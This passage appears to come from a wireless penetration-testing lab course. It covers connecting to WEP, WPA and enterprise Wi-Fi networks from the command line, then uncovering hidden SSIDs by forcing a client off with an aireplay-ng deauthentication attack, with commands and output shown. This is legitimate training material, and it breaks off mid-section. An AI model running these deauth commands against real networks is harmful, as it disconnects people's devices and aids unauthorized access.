+<li><code>Connect</code> <img src="storage\modules\222\wifi_connect.png" alt="Desktop screenshot showing Wi-Fi menu with networks: CyberNet-Secure, HackTheBox-WEP, HTB-Corp, and options for VPN connections and enabling Wi-Fi."> <img src="storage\modules\222\bypass_mac\bypass_mac_2.png" alt="Wi-Fi authentication prompt for network 'HTB-Wireless-5G' showing password entry field with 'Password123!!!!!!' and 'Show password' option."> <img src="storage\modules\222\bypass_mac\bypass_mac_3.png" alt="Notification showing 'Connection Established' to Wi-Fi network 'HTB-Wireless-5G' with option to dismiss message."></li>
+</ol>
+<hr>
+<h3 id="using-cli">Using CLI</h3>
+<p>If we've obtained the correct password for a network or simply want to connect to one, we may not always have access to the graphical network manager. In such cases, we’ll need to connect to the wireless network using the terminal. Fortunately, there are several methods available to achieve this from the command line. To connect to a network via the command line, we would use <code>wpa_supplicant</code> along with a <code>configuration</code> file that contains the necessary network details. This allows us to authenticate and connect to the network directly from the terminal.</p>
+<p>Typically, we would switch our interface to monitor mode to scan for nearby networks. However, if we're limited or our interface doesn't support monitor mode, we can use managed mode instead. In this case, we can utilize the iwlist tool along with some grep parameters to filter and display useful information like the cell, signal quality, ESSID, and IEEE version of the networks around us.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo iwlist wlan0 s | grep <span class="hljs-string">'Cell\|Quality\|ESSID\|IEEE'</span>
+
+          Cell <span class="hljs-number">01</span> - <span class="hljs-string">Address:</span> <span class="hljs-string">D8:</span><span class="hljs-string">D6:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-string">EB:</span><span class="hljs-number">29</span>:D5
+                    Quality=<span class="hljs-number">61</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-49</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"HackMe"</span>
+<span class="hljs-symbol">                    IE:</span> IEEE <span class="hljs-number">802.11</span>i/WPA2 Version <span class="hljs-number">1</span>
+          Cell <span class="hljs-number">02</span> - <span class="hljs-string">Address:</span> <span class="hljs-number">3</span><span class="hljs-string">E:</span><span class="hljs-string">C1:</span><span class="hljs-string">D0:</span><span class="hljs-string">F2:</span><span class="hljs-number">5</span><span class="hljs-string">D:</span><span class="hljs-number">6</span>A
+                    Quality=<span class="hljs-number">70</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-30</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"HackTheBox"</span>
+          Cell <span class="hljs-number">03</span> - <span class="hljs-string">Address:</span> <span class="hljs-number">9</span><span class="hljs-string">C:</span><span class="hljs-number">9</span><span class="hljs-string">A:</span><span class="hljs-number">03</span>:<span class="hljs-number">39</span>:<span class="hljs-string">BD:</span><span class="hljs-number">71</span>
+                    Quality=<span class="hljs-number">70</span>/<span class="hljs-number">70</span>  Signal level=<span class="hljs-number">-30</span> dBm  
+<span class="hljs-symbol">                    ESSID:</span><span class="hljs-string">"HTB-Corp"</span>
+<span class="hljs-symbol">                    IE:</span> IEEE <span class="hljs-number">802.11</span>i/WPA2 Version <span class="hljs-number">1</span>
+</code></pre>
+<p>As shown in the output above, there are three available Wi-Fi networks. One uses <code>WEP</code>, one uses <code>WPA</code>, and one uses <code>WPA-Enterprise</code>. We'll begin by connecting to the WEP network first.</p>
+<p><strong>Connecting to WEP Networks</strong></p>
+<p>If the target network is using WEP, connecting is straightforward. We just need to provide the <code>SSID</code>, the <code>WEP hex key</code>, and set the WEP key index using <code>wep_tx_keyidx</code> in a configuration file (e.g., wep.conf) to establish the connection. Additionally, we set <code>key_mgmt=NONE</code>, which is used for WEP or networks with no security.</p>
+<p>Code: config</p>
+<pre><code class="lang-config"><span class="hljs-attr">network={</span>
+    <span class="hljs-attr">ssid="HackTheBox"</span>
+    <span class="hljs-attr">key_mgmt=NONE</span>
+    <span class="hljs-attr">wep_key0=3C1C3A3BAB</span>
+    <span class="hljs-attr">wep_tx_keyidx=0</span>
+}
+</code></pre>
+<p>Once the configuration file is ready, we can use <code>wpa_supplicant</code> to connect to the network. We run the command with the <code>-c</code> option to specify the configuration file and the <code>-i</code> option to specify the network interface.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo wpa_supplicant -c wep.conf -i wlan0
+
+Successfully initialized wpa_supplicant
+<span class="hljs-string">wlan0:</span> <span class="hljs-string">SME:</span> Trying to authenticate with <span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-string">c1:</span><span class="hljs-string">d0:</span><span class="hljs-string">f2:</span><span class="hljs-number">5</span><span class="hljs-string">d:</span><span class="hljs-number">6</span>a (SSID=<span class="hljs-string">'HackTheBox'</span> freq=<span class="hljs-number">2412</span> MHz)
+<span class="hljs-string">wlan0:</span> Trying to associate with <span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-string">c1:</span><span class="hljs-string">d0:</span><span class="hljs-string">f2:</span><span class="hljs-number">5</span><span class="hljs-string">d:</span><span class="hljs-number">6</span>a (SSID=<span class="hljs-string">'HackTheBox'</span> freq=<span class="hljs-number">2412</span> MHz)
+<span class="hljs-string">wlan0:</span> Associated with <span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-string">c1:</span><span class="hljs-string">d0:</span><span class="hljs-string">f2:</span><span class="hljs-number">5</span><span class="hljs-string">d:</span><span class="hljs-number">6</span>a
+<span class="hljs-string">wlan0:</span> CTRL-EVENT-CONNECTED - Connection to <span class="hljs-number">3</span><span class="hljs-string">e:</span><span class="hljs-string">c1:</span><span class="hljs-string">d0:</span><span class="hljs-string">f2:</span><span class="hljs-number">5</span><span class="hljs-string">d:</span><span class="hljs-number">6</span>a completed [id=<span class="hljs-number">0</span> id_str=]
+<span class="hljs-string">wlan0:</span> CTRL-EVENT-SUBNET-STATUS-UPDATE status=<span class="hljs-number">0</span>
+</code></pre>
+<p>After connecting, we can obtain an IP address by using the <code>dhclient</code> utility. This will assign an IP from the network's DHCP server, completing the connection setup.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dhclient wlan0
+</code></pre>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ifconfig wlan0
+
+wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.2.7  netmask 255.255.255.0  broadcast 192.168.2.255
+        ether f6:65:bc:77:c9:21  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
+        RX packets<span class="hljs-number"> 7 </span> bytes<span class="hljs-number"> 1217 </span>(1.2 KB)
+        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
+        TX packets<span class="hljs-number"> 14 </span> bytes<span class="hljs-number"> 3186 </span>(3.1 KB)
+        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
+</code></pre>
+<p><strong>Connecting to WPA Personal Networks</strong></p>
+<p>If the target network uses WPA/WPA2, we'll need to create a wpa_supplicant configuration file (eg: wpa.conf) with the correct <code>PSK</code> (Pre-Shared Key) and <code>SSID</code>. This file will look like the following:</p>
+<p>Code: config</p>
+<pre><code class="lang-config"><span class="hljs-attribute">network</span>={
+    ssid=<span class="hljs-string">"HackMe"</span>
+    psk=<span class="hljs-string">"password123"</span>
+}
+</code></pre>
+<p>Then we could initiate our wpa connection to the AP using the following command.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo wpa_supplicant -c wpa.conf -i wlan0
+
+Successfully initialized wpa_supplicant
+<span class="hljs-string">wlan0:</span> <span class="hljs-string">SME:</span> Trying to authenticate with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 (SSID=<span class="hljs-string">'HackMe'</span> freq=<span class="hljs-number">2412</span> MHz)
+<span class="hljs-string">wlan0:</span> Trying to associate with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 (SSID=<span class="hljs-string">'HackMe'</span> freq=<span class="hljs-number">2412</span> MHz)
+<span class="hljs-string">wlan0:</span> Associated with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5
+<span class="hljs-string">wlan0:</span> CTRL-EVENT-SUBNET-STATUS-UPDATE status=<span class="hljs-number">0</span>
+<span class="hljs-string">wlan0:</span> <span class="hljs-string">WPA:</span> Key negotiation completed with <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 [PTK=CCMP GTK=CCMP]
+<span class="hljs-string">wlan0:</span> CTRL-EVENT-CONNECTED - Connection to <span class="hljs-string">d8:</span><span class="hljs-string">d6:</span><span class="hljs-number">3</span><span class="hljs-string">d:</span><span class="hljs-string">eb:</span><span class="hljs-number">29</span>:d5 completed [id=<span class="hljs-number">0</span> id_str=]
+</code></pre>
+<p>After connecting, we can obtain an IP address by using the <code>dhclient</code> utility. This will assign an IP from the network's DHCP server, completing the connection setup. However, if we have a previously assigned DHCP IP address from a different connection, we'll need to release it first. Run the following command to remove the existing IP address:</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dhclient wlan0 -r
+
+Killed old client process
+</code></pre>
+<p>We can now run the dhclient command. This will assign an IP from the network's DHCP server, completing the connection setup.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dhclient wlan0
+</code></pre>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ifconfig wlan0
+
+wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.1.7  netmask 255.255.255.0  broadcast 192.168.1.255
+        ether f6:65:bc:77:c9:21  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
+        RX packets<span class="hljs-number"> 37 </span> bytes<span class="hljs-number"> 6266 </span>(6.2 KB)
+        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
+        TX packets<span class="hljs-number"> 41 </span> bytes<span class="hljs-number"> 6967 </span>(6.9 KB)
+        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
+</code></pre>
+<p>If the network uses <code>WPA3</code> instead of WPA2, we would need to add <code>key_mgmt=SAE</code> to our wpa_supplicant configuration file to connect to it. This setting specifies the use of the <code>Simultaneous Authentication of Equals (SAE)</code> protocol, which is a key component of WPA3 security.</p>
+<p><strong>Connecting to WPA Enterprise</strong></p>
+<p>If the target network uses WPA/WPA2 Enterprise (MGT), we'll need to create a wpa_supplicant configuration file with the correct <code>identity</code>, <code>password</code>, <code>SSID</code> and <code>key_mgmt</code>. This file will look like this:</p>
+<p>Code: config</p>
+<pre><code class="lang-config"><span class="hljs-attr">network={</span>
+  <span class="hljs-attr">ssid="HTB-Corp"</span>
+  <span class="hljs-attr">key_mgmt=WPA-EAP</span>
+  <span class="hljs-attr">identity="HTB\Administrator"</span>
+  <span class="hljs-attr">password="Admin@123"</span>
+}
+</code></pre>
+<p>Once the configuration file is ready, we can use <code>wpa_supplicant</code> to connect to the network. We run the command with the <code>-c</code> option to specify the configuration file and the <code>-i</code> option to specify the network interface.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo wpa_supplicant -c wpa_enterprsie.conf -i wlan0
+
+Successfully initialized wpa_supplicant
+wlan0: SME: Trying <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span> <span class="hljs-number">9</span>c:<span class="hljs-number">9</span>a:<span class="hljs-number">03</span>:<span class="hljs-number">39</span>:bd:<span class="hljs-number">71</span> (SSID=<span class="hljs-string">'HTB-Corp'</span> freq=<span class="hljs-number">2412</span> MHz)
+wlan0: Trying <span class="hljs-keyword">to</span> associate <span class="hljs-keyword">with</span> <span class="hljs-number">9</span>c:<span class="hljs-number">9</span>a:<span class="hljs-number">03</span>:<span class="hljs-number">39</span>:bd:<span class="hljs-number">71</span> (SSID=<span class="hljs-string">'HTB-Corp'</span> freq=<span class="hljs-number">2412</span> MHz)
+wlan0: Associated <span class="hljs-keyword">with</span> <span class="hljs-number">9</span>c:<span class="hljs-number">9</span>a:<span class="hljs-number">03</span>:<span class="hljs-number">39</span>:bd:<span class="hljs-number">71</span>
+wlan0: CTRL-<span class="hljs-keyword">EVENT</span>-SUBNET-STATUS-UPDATE status=<span class="hljs-number">0</span>
+wlan0: CTRL-<span class="hljs-keyword">EVENT</span>-EAP-STARTED EAP authentication started
+wlan0: CTRL-<span class="hljs-keyword">EVENT</span>-EAP-PROPOSED-<span class="hljs-function"><span class="hljs-keyword">METHOD</span> <span class="hljs-title">vendor</span>=0 <span class="hljs-title">method</span>=25
+<span class="hljs-title">wlan0</span>:</span> CTRL-<span class="hljs-keyword">EVENT</span>-EAP-<span class="hljs-function"><span class="hljs-keyword">METHOD</span> <span class="hljs-title">EAP</span> <span class="hljs-title">vendor</span> 0 <span class="hljs-title">method</span> 25 <span class="hljs-params">(PEAP)</span> <span class="hljs-title">selected</span>
+<span class="hljs-title">wlan0</span>:</span> CTRL-<span class="hljs-keyword">EVENT</span>-EAP-PEER-CERT depth=<span class="hljs-number">0</span> subject=<span class="hljs-string">'/C=US/ST=California/L=San Fransisco/O=HTB/CN=htb.com'</span> hash=<span class="hljs-number">46</span>b80ecdee1a588b1fed111307a618b8e4429d7cb9e639fe976741e1a1e2b7ae
+wlan0: CTRL-<span class="hljs-keyword">EVENT</span>-EAP-PEER-CERT depth=<span class="hljs-number">0</span> subject=<span class="hljs-string">'/C=US/ST=California/L=San Fransisco/O=HTB/CN=htb.com'</span> hash=<span class="hljs-number">46</span>b80ecdee1a588b1fed111307a618b8e4429d7cb9e639fe976741e1a1e2b7ae
+EAP-MSCHAPV2: Authentication succeeded
+wlan0: CTRL-<span class="hljs-keyword">EVENT</span>-EAP-SUCCESS EAP authentication completed successfully
+wlan0: PMKSA-CACHE-ADDED <span class="hljs-number">9</span>c:<span class="hljs-number">9</span>a:<span class="hljs-number">03</span>:<span class="hljs-number">39</span>:bd:<span class="hljs-number">71</span> <span class="hljs-number">0</span>
+wlan0: WPA: Key negotiation completed <span class="hljs-keyword">with</span> <span class="hljs-number">9</span>c:<span class="hljs-number">9</span>a:<span class="hljs-number">03</span>:<span class="hljs-number">39</span>:bd:<span class="hljs-number">71</span> [PTK=CCMP GTK=CCMP]
+wlan0: CTRL-<span class="hljs-keyword">EVENT</span>-CONNECTED - Connection <span class="hljs-keyword">to</span> <span class="hljs-number">9</span>c:<span class="hljs-number">9</span>a:<span class="hljs-number">03</span>:<span class="hljs-number">39</span>:bd:<span class="hljs-number">71</span> completed [id=<span class="hljs-number">0</span> id_str=]
+</code></pre>
+<p>After connecting, we can obtain an IP address by using the <code>dhclient</code> utility. This will assign an IP from the network's DHCP server, completing the connection setup. However, if we have a previously assigned DHCP IP address from a different connection, we'll need to release it first. Run the following command to remove the existing IP address:</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dhclient wlan0 -r
+
+Killed old client process
+</code></pre>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo dhclient wlan0
+</code></pre>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ifconfig wlan0
+
+wlan0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.3.7  netmask 255.255.255.0  broadcast 192.168.3.255
+        ether f6:65:bc:77:c9:21  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
+        RX packets<span class="hljs-number"> 66 </span> bytes<span class="hljs-number"> 10226 </span>(10.2 KB)
+        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
+        TX packets<span class="hljs-number"> 77 </span> bytes<span class="hljs-number"> 11532 </span>(11.5 KB)
+        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
+</code></pre>
+<p><strong>Connecting with Network Manager Utilities</strong></p>
+<p>One of the ways that we can easily connect to wireless networks in Linux is through the usage of nmtui. This utility will give us a somewhat graphical perspective while connecting to these wireless networks.</p>
+<p>  Connecting to Wi-Fi Networks</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo nmtui
+</code></pre>
+<p>Once we enter the command above, we should see the following view.</p>
+<p><img src="storage\modules\222\1-connect.png" alt="NetworkManager TUI menu with options: Edit a connection, Activate a connection, Set system hostname, and Quit."></p>
+<p>If we select <code>Activate a connection</code>, we should be able to choose from a list of wireless networks. We might be prompted to enter our password upon connecting to the network.</p>
+<p><img src="storage\modules\222\2-connect.png" alt="NetworkManager TUI showing options: Wired connection 1, Wi-Fi, and Bridge (docker0), with 'Deactivate' option."></p>
+<hr>
+<h3 id="moving-on">Moving On</h3>
+<p>In the next section, we will delve into effective methods for discovering <code>hidden SSIDs</code> (Service Set Identifiers). Hidden SSIDs are networks that do not broadcast their network name, making them less visible to casual users and potential attackers. However, with the right techniques and tools, these hidden networks can still be identified and analyzed.</p>
+<hr>
+<h2 id="finding-hidden-ssids">Finding Hidden SSIDs</h2>
+<hr>
+<p>In WiFi networks, the Service Set Identifier (SSID) is the name that identifies a particular wireless network. While most networks broadcast their SSIDs to make it easy for devices to connect, some networks choose to hide their SSIDs as a security measure. The idea behind hiding an SSID is to make the network less visible to casual users and potential attackers. However, this method only provides a superficial layer of security, as determined attackers can still discover hidden SSIDs using various techniques.</p>
+<p>In this section, we'll delve into the methods used to uncover these hidden network names. Understanding how to find hidden SSIDs is crucial for both network administrators looking to secure their networks and penetration testers aiming to assess the security of wireless environments. By the end of this section, you'll have a comprehensive understanding of the tools and techniques used to reveal hidden SSIDs, enhancing your overall knowledge of WiFi security.</p>
+<p><img src="storage\modules\222\hidden_ssid\hidden_1.png" alt="Wi-Fi menu showing options: Connect to Hidden Wi-Fi Network, VPN Connections, Enable Networking, Enable Wi-Fi, and Edit Connections."></p>
+<p>As shown in the above screenshot, no WiFi networks are visible during the scan. Let's proceed by attempting to uncover some hidden WiFi networks.</p>
+<hr>
+<p><strong>Watching the Hidden Network</strong></p>
+<p>First, we need to set our interface to monitor mode.</p>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<hr>
+<p><strong>Scanning WiFi Networks</strong></p>
+<p>We can use <code>airodump-ng</code> to scan for available wifi networks.</p>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 1 </span>wlan0mon
+
+CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 0 </span>s ][ 2024-05-21 20:45 
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ B2:C1:3D:3B:2B:A1  -47  <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 9 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  &lt;length: 12&gt;                                
+ D2:A3:32:13:29:D5  -28  <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 9 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA3 CCMP   SAE  &lt;length:  8&gt;                                
+ A2:FF:31:2C:B1:C4  -28  <span class="hljs-number"> 0 </span>      <span class="hljs-number"> 9 </span>      <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WPA2 CCMP   PSK  &lt;length:  4&gt;                                
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ B2:C1:3D:3B:2B:A1  02:00:00:00:02:00  -29   <span class="hljs-number"> 0 </span>-24     <span class="hljs-number"> 0 </span>       4
+</code></pre>
+<p>From the above output, we can see that there are three hidden SSIDs. The <code>&lt;length: x&gt;</code> notation indicates the length of the WiFi network name, where x represents the number of characters in the SSID.</p>
+<p>There are multiple ways to discover the name of a hidden SSID. If there are clients connected to the WiFi network, we can use <code>aireplay-ng</code> to send deauthentication requests to the client. When the client reconnects to the hidden SSID, <code>airodump-ng</code> will capture the request and reveal the SSID. However, deauthentication attacks do not work on <a href="https://github.com/aircrack-ng/aircrack-ng/issues/2539">WPA3</a> networks since WPA3 has 802.11w (Protected Management Frames, <a href="https://www.wi-fi.org/beacon/philipp-ebbecke/protected-management-frames-enhance-wi-fi-network-security">PMF</a>) which authenticates the deauthentication. In such cases, we can attempt a brute-force attack to determine the SSID name.</p>
+<hr>
+<h4 id="detecting-hidden-ssid-using-deauth">Detecting Hidden SSID using Deauth</h4>
+<p>The first way to find a hidden SSID is to perform a deauthentication attack on the clients connected to the WiFi network, which allows us to capture the request when they reconnect. From the above <code>airodump-ng</code> scan, we observed that a client with the STATION ID <code>02:00:00:00:02:00</code> is connected to the BSSID <code>B2:C1:3D:3B:2B:A1</code>. Let's start the <code>airodump-ng</code> capture on channel <code>1</code> and use <code>aireplay-ng</code> to send deauthentication requests to the client.</p>
+<p>We should start sniffing our network on <code>channel 1</code> with airodump-ng.</p>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo airodump-ng -c <span class="hljs-number">1</span> wlan0mon
+</code></pre>
+<p>In order to force the client to send a probe request, it needs to be disconnected. We can do this with aireplay-ng.</p>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ sudo aireplay-ng <span class="hljs-number">-0</span> <span class="hljs-number">10</span> -a <span class="hljs-string">B2:</span><span class="hljs-string">C1:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-number">3</span><span class="hljs-string">B:</span><span class="hljs-number">2</span><span class="hljs-string">B:</span>A1 -c <span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span> wlan0mon
+<span class="hljs-symbol">
+12:</span><span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Waiting <span class="hljs-keyword">for</span> beacon frame (<span class="hljs-string">BSSID:</span> <span class="hljs-string">B2:</span><span class="hljs-string">C1:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-number">3</span><span class="hljs-string">B:</span><span class="hljs-number">2</span><span class="hljs-string">B:</span>A1) on channel `
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">60</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">57</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">61</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">60</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">59</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">58</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">58</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">58</span> ACKs]
+<span class="hljs-number">12</span>:<span class="hljs-number">34</span>:<span class="hljs-number">56</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-number">02</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">02</span>:<span class="hljs-number">00</span>] [ <span class="hljs-number">11</span>|<span class="hljs-number">55</span> ACKs]
+</code></pre>
+<p>After sending the deauthentication requests using <code>aireplay-ng</code>, we should see the name of the hidden SSID appear in <code>airodump-ng</code> once the client reconnects to the WiFi network. This process leverages the re-association request, which contains the SSID name, and allows us to capture and identify the hidden SSID.</p>
+<p>  Finding Hidden SSIDs</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 1 </span>wlan0mon
+
